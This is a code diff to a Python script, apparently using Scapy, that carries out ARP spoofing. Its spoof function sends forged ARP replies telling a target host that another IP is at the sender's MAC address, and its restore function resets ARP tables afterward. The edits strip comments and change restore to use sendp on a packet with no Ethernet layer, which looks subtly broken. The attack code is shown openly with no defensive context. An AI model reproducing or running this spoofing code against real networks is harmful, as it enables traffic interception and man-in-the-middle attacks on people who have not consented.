@@ -37,17 +37,11 @@ def spoof(target_ip, spoofed_ip):
         print(f"[ERROR] Could not retrieve MAC for {target_ip}. Skipping spoof.")
         return
 
-    # Create the ARP reply packet.
     packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
-    # Optionally, set our source MAC explicitly:
-    # packet.hwsrc = get_if_hwaddr(conf.iface)
     print(f"[DEBUG] Sending spoofed ARP reply: Telling {target_ip} that {spoofed_ip} is at our MAC.")
     sendp(packet, verbose=False)
 
 def restore(destination_ip, source_ip):
-    """
-    Restore the original ARP mapping by sending the correct ARP reply.
-    """
     print(f"[INFO] Restoring ARP tables for {destination_ip}...")
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
@@ -57,7 +51,7 @@ def restore(destination_ip, source_ip):
     packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                  psrc=source_ip, hwsrc=source_mac)
     # Send the restoration packet multiple times.
-    send(packet, count=4, verbose=False)
+    sendp(packet, count=4, verbose=False)
     print(f"[INFO] ARP tables restored for {destination_ip}.")
 
 def main():
